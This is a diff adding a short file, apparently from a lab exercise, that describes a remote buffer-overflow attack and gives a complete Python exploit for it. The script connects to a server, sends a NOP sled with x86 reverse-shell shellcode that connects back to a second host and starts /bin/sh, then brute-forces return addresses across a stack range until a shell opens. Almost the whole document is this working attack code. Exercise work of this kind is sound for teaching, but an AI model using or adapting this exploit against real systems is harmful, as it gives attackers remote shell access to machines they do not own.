@@ -1,0 +1,21 @@
+The aim is to do a buffer-overflow attack on a remote server.
+This uses socket programming to connect with the server.
+The code creates a NOP Sled, inserts the shell code and the return address is searched and modified in the bspecific address range until the shell is achieved.
+
+Code:
+
+import socket
+import sys
+import struct
+HOST = "192.168.1.77"
+PORT = 4003
+a=0xfffdd000
+b=0xffffe000
+for i in range (a,b,50):
+        
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((HOST, PORT))
+        s.send(b"49|49-Z0w4dXU2XGTs7hJ_9WshLA-49|"+b"\x90"*374+b"\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\xc0\xa8\x01\x37\x66\x68\x0f\xbb\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + struct.pack("<I",i)*15)        
+        rec = s.recv(1024)
+        print(rec)
+        s.close()
